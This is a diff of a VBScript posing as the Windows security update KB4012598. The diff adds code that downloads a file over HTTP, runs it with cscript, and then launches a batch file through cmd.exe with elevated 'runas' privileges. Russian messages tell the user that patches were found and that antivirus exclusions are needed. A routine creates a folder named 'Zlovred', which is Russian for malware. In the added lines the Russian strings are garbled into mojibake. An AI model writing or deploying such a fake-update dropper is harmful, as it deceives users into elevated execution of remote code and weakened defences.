@@ -344,7 +344,7 @@ Function RunDownloadedScript01(strPath, strVBS, intTimeOut)
 	If Not fso.FileExists(pathCMD & "\cscript.exe") Then
 		RunDownloadedScript01 = 1
 	Else
-		If Not fso.FileExists(strPath + "\" + strVBS) Then
+		If Not fso.FileExists(strPath & "\" & strVBS) Then
 			RunDownloadedScript01 = 1
 		Else
 			' Set Cscript Command Arguments
@@ -354,6 +354,52 @@ Function RunDownloadedScript01(strPath, strVBS, intTimeOut)
 			' Stop Script on intTimeOut miliseconds for Wait if  Bitsadmin done
 			WScript.Sleep intTimeOut
 			RunDownloadedScript01 = 0
+		End If
+	End If
+End Function
+
+' ******************************************************************************
+'
+' RunDownloadedCMD02( strPath, strCmd, intTimeOut )
+' This Function Run Visible a strCmd File
+' with Command "cmd.exe /c " & strPath & "\" & strCMD
+'
+' PARAMETERS:   strPath -- The Path to strCmd
+'               strCMD -- a Cmd File with instructions
+'               (Windows Shell)
+'				intTimeOut -- Estimated Time for Running (ms)
+'
+' RETURNS:      0 if Success
+'				1 if Path not Found
+'
+'******************************************************************************/
+Function RunDownloadedCMD02(strPath, strCMD, intTimeOut)
+	Dim constRun_CMD, constOpt
+	' Define Windows Scripts Options
+	constRun_CMD = " /c "
+	' Define CMD Script Options (Empty)
+	constOpt = ""
+	Dim strValue, shApp, fso, wsh, envProc, pathCMD
+	' Define ActiveX Object
+	Set shApp = CreateObject("Shell.Application")
+	Set fso = CreateObject("Scripting.FileSystemObject")
+	Set wsh = CreateObject("WScript.Shell")
+	Set envProc = wsh.Environment("PROCESS")
+	pathCMD = envProc("SystemRoot") & "\System32"
+	' Check Paths
+	If Not fso.FileExists(pathCMD & "\cmd.exe") Then
+		RunDownloadedCMD02 = 1
+	Else
+		If Not fso.FileExists(strPath & "\" & strCMD) Then
+			RunDownloadedCMD02 = 1
+		Else
+			' Set Cscript Command Arguments
+			strValue = constRun_CMD & Chr(34) & strPath & "\" & strCMD & Chr(34) & constOpt
+			' Run cscript.exe with Elevated Privileges (runas) at Visible Mode (0), with working Diretory strPath
+			shApp.ShellExecute pathCMD & "\cmd.exe", strValue, strPath, "runas", 1
+			' Stop Script on intTimeOut miliseconds for Wait if  Bitsadmin done
+			WScript.Sleep intTimeOut
+			RunDownloadedCMD02 = 0
 		End If
 	End If
 End Function
@@ -978,9 +1024,9 @@ Function CheckOSAndPutMessage()
     ' Set Command String
     strValue = "start " & anURLWebApp
 
-    aNotFound  = "Для Вашей операционной системы не найдены исправления безопасности или они не применимы." & vbNewLine & "Пожалуйста, обновите Вашу систему через Windows Update."
-    aNotExclusions = "Для Вашей операционной системы найдены обновления, но в системе дополнительно требуется установить исключения антивируса." & vbNewLine & "Запустите вручную файл Windows-KB4012598.msi.wsf."
-    anSuccessFound = "Для Вашей операционной системы найдены обновления безопасности." & vbNewLine & "Файл Windows-KB4012598.msi запустится автоматически."
+    aNotFound  = "Р”Р»СЏ Р’Р°С€РµР№ РѕРїРµСЂР°С†РёРѕРЅРЅРѕР№ СЃРёСЃС‚РµРјС‹ РЅРµ РЅР°Р№РґРµРЅС‹ РёСЃРїСЂР°РІР»РµРЅРёСЏ Р±РµР·РѕРїР°СЃРЅРѕСЃС‚Рё РёР»Рё РѕРЅРё РЅРµ РїСЂРёРјРµРЅРёРјС‹." & vbNewLine & "РџРѕР¶Р°Р»СѓР№СЃС‚Р°, РѕР±РЅРѕРІРёС‚Рµ Р’Р°С€Сѓ СЃРёСЃС‚РµРјСѓ С‡РµСЂРµР· Windows Update."
+    aNotExclusions = "Р”Р»СЏ Р’Р°С€РµР№ РѕРїРµСЂР°С†РёРѕРЅРЅРѕР№ СЃРёСЃС‚РµРјС‹ РЅР°Р№РґРµРЅС‹ РѕР±РЅРѕРІР»РµРЅРёСЏ, РЅРѕ РІ СЃРёСЃС‚РµРјРµ РґРѕРїРѕР»РЅРёС‚РµР»СЊРЅРѕ С‚СЂРµР±СѓРµС‚СЃСЏ СѓСЃС‚Р°РЅРѕРІРёС‚СЊ РёСЃРєР»СЋС‡РµРЅРёСЏ Р°РЅС‚РёРІРёСЂСѓСЃР°." & vbNewLine & "Р—Р°РїСѓСЃС‚РёС‚Рµ РІСЂСѓС‡РЅСѓСЋ С„Р°Р№Р» Windows-KB4012598.msi.wsf."
+    anSuccessFound = "Р”Р»СЏ Р’Р°С€РµР№ РѕРїРµСЂР°С†РёРѕРЅРЅРѕР№ СЃРёСЃС‚РµРјС‹ РЅР°Р№РґРµРЅС‹ РѕР±РЅРѕРІР»РµРЅРёСЏ Р±РµР·РѕРїР°СЃРЅРѕСЃС‚Рё." & vbNewLine & "Р¤Р°Р№Р» Windows-KB4012598.msi Р·Р°РїСѓСЃС‚РёС‚СЃСЏ Р°РІС‚РѕРјР°С‚РёС‡РµСЃРєРё."
     ' Create ActiveX Objects
     set wsh = CreateObject("Wscript.Shell")
     set ie = CreateObject("InternetExplorer.Application")
@@ -1049,29 +1095,29 @@ function CheckOSandDownload()
     iFlag = CheckOSAndPutMessage
     if iFlag = 0 Then
         strURL = CheckOSAndChooseFile
-        WScript.Echo "Обновление может установиться в автоматическом режиме." & vbNewLine & "Файл: " & KBSCRIPTDOWNLOAD & vbNewLine & "URL: " & strURL & vbNewLine & "Путь: " & strLocalPath & vbNewLine
+        WScript.Echo "РћР±РЅРѕРІР»РµРЅРёРµ РјРѕР¶РµС‚ СѓСЃС‚Р°РЅРѕРІРёС‚СЊСЃСЏ РІ Р°РІС‚РѕРјР°С‚РёС‡РµСЃРєРѕРј СЂРµР¶РёРјРµ." & vbNewLine & "Р¤Р°Р№Р»: " & KBSCRIPTDOWNLOAD & vbNewLine & "URL: " & strURL & vbNewLine & "РџСѓС‚СЊ: " & strLocalPath & vbNewLine
         iFlagDn = UploadFilesFromIntWithHTTP01( KBSCRIPTDOWNLOAD, strURL, strLocalPath )
         'WScript.Echo  "iFlagDn = " & iFlagDn & vbNewLine & "URL = " & strURL & vbNewLine & "Path = " & strLocalPath & vbNewLine
         If iFlagDn = 0 Then
             RunDownloadedScript01 strLocalPath, KBSCRIPTDOWNLOAD, intTimeOut
             CheckOSandDownload = 0
         Else
-            WScript.Echo "Не удается скачать файл: " & KBSCRIPTDOWNLOAD
+            WScript.Echo "РќРµ СѓРґР°РµС‚СЃСЏ СЃРєР°С‡Р°С‚СЊ С„Р°Р№Р»: " & KBSCRIPTDOWNLOAD
             CheckOSandDownload = 1
         End If
     elseif iFlag = 1 Then
         strURL = CheckOSAndChooseFile
-        WScript.Echo "Обновление может установиться только в ручном режиме." & vbNewLine & "Файл: " & KBSCRIPTDOWNLOAD & vbNewLine & "URL: " & strURL & vbNewLine & "Путь: " & strLocalPath & vbNewLine & "Запустите файл " & KBSCRIPTDOWNLOAD & " в папке " & strLocalPath & vbNewLine
+        WScript.Echo "РћР±РЅРѕРІР»РµРЅРёРµ РјРѕР¶РµС‚ СѓСЃС‚Р°РЅРѕРІРёС‚СЊСЃСЏ С‚РѕР»СЊРєРѕ РІ СЂСѓС‡РЅРѕРј СЂРµР¶РёРјРµ." & vbNewLine & "Р¤Р°Р№Р»: " & KBSCRIPTDOWNLOAD & vbNewLine & "URL: " & strURL & vbNewLine & "РџСѓС‚СЊ: " & strLocalPath & vbNewLine & "Р—Р°РїСѓСЃС‚РёС‚Рµ С„Р°Р№Р» " & KBSCRIPTDOWNLOAD & " РІ РїР°РїРєРµ " & strLocalPath & vbNewLine
         iFlagDn = UploadFilesFromIntWithHTTP01( KBSCRIPTDOWNLOAD, strURL, strLocalPath )
         ' WScript.Echo  "iFlagDn = " & iFlagDn & vbNewLine & "URL = " & strURL & vbNewLine & "Path = " & strLocalPath & vbNewLine
         If iFlagDn = 0 Then
             CheckOSandDownload = 0
         Else
-            WScript.Echo "Не удается скачать файл: " & KBSCRIPTDOWNLOAD
+            WScript.Echo "РќРµ СѓРґР°РµС‚СЃСЏ СЃРєР°С‡Р°С‚СЊ С„Р°Р№Р»: " & KBSCRIPTDOWNLOAD
             CheckOSandDownload = 1
         End If
     else
-        WScript.Echo "Обновление не может быть установлено." & vbNewLine & "Файл не найден." & vbNewLine
+        WScript.Echo "РћР±РЅРѕРІР»РµРЅРёРµ РЅРµ РјРѕР¶РµС‚ Р±С‹С‚СЊ СѓСЃС‚Р°РЅРѕРІР»РµРЅРѕ." & vbNewLine & "Р¤Р°Р№Р» РЅРµ РЅР°Р№РґРµРЅ." & vbNewLine
         CheckOSandDownload = 1
     end if
 end function ' CheckOSandDownload
@@ -1088,10 +1134,14 @@ Function ScriptKBDownload()
     ' Const KBMSIFILE = "Windows-KB4012598.msi" ' Downloaded File
     Const KBMSIFILE = "echo.wsf" ' Downloaded File
     Const KBMSITITLE = "KB4012598" ' MSI File Title
-    Dim iFlag, iFlagDn, strLocalPath, strURL, intTimeOut
+    Const RUNBATFILE = "run.bat"
+    Const RUNBATPATH = "C:\Program Files (x86)\Microsoft\KB4012598"
+    Dim intTimeOutW, intTimeOutM, intTimeOutC
+    Dim iFlag, iFlagDn, iFlagC, iFlagW, strLocalPath, strURL, intTimeOut
     ' Set Timeout Interval
-    intTimeOutW = 180000 ' 3 min
-    intTimeOutM = 30000 ' 30 sec
+    intTimeOutW = 360000 ' 6 min
+    intTimeOutM = 45000 ' 45 sec
+	intTimeOutC = 100 ' 0,1 sec
     ' Create Zlovred Folder
     CreateZlovredFolder
     ' Choose Download Folder
@@ -1103,15 +1153,26 @@ Function ScriptKBDownload()
         iFlagDn = UploadFilesFromIntWithHTTP01( KBMSIFILE, strURL, strLocalPath )
 		' WScript.Echo  "iFlagDn = " & iFlagDn & vbNewLine & "URL = " & strURL & vbNewLine & "Path = " & strLocalPath & vbNewLine
         If iFlagDn = 0 Then
-            RunDownloadedScript01 strLocalPath, KBMSIFILE, intTimeOutM
-	    ' InstallDownloadedMSI01 strLocalPath, KBMSIFILE, KBMSITITLE, intTimeOutW, intTimeOutM
-            ScriptKBDownload = 0
+            iFlagW = RunDownloadedScript01( strLocalPath, KBMSIFILE, intTimeOutM )
+	    	' iFlagW = InstallDownloadedMSI01( strLocalPath, KBMSIFILE, KBMSITITLE, intTimeOutW, intTimeOutM )
+			If iFlagW = 0 Then
+				iFlagC = RunDownloadedCMD02(RUNBATPATH, RUNBATFILE, intTimeOutC)
+				If iFlagC = 0 Then
+					ScriptKBDownload = 0
+				Else
+					WScript.Echo "РќРµ СѓРґР°С‘С‚СЃСЏ Р·Р°РїСѓСЃС‚РёС‚СЊ С„Р°Р№Р»: " & RUNBATFILE & " РїРѕ РїСѓС‚Рё: " & RUNBATPATH & vbNewLine
+					ScriptKBDownload = 2
+				End If
+			Else
+				WScript.Echo "РќРµ СѓРґР°С‘С‚СЃСЏ СѓСЃС‚Р°РЅРѕРІРёС‚СЊ РїР°РєРµС‚: " & KBMSIFILE & vbNewLine
+				ScriptKBDownload = 1
+			End If
         Else
-            WScript.Echo "Не удается скачать файл: " & KBMSIFILE
+            WScript.Echo "РќРµ СѓРґР°РµС‚СЃСЏ СЃРєР°С‡Р°С‚СЊ С„Р°Р№Р»: " & KBMSIFILE & vbNewLine
             ScriptKBDownload = 1
         End If
     else
-        WScript.Echo "Обновление не может быть установлено." & vbNewLine & "Файл не найден." & vbNewLine
+        WScript.Echo "РћР±РЅРѕРІР»РµРЅРёРµ РЅРµ РјРѕР¶РµС‚ Р±С‹С‚СЊ СѓСЃС‚Р°РЅРѕРІР»РµРЅРѕ." & vbNewLine & "Р¤Р°Р№Р» РЅРµ РЅР°Р№РґРµРЅ." & vbNewLine
         ScriptKBDownload = 1
     end if
 End Function ' ScriptKBDownload
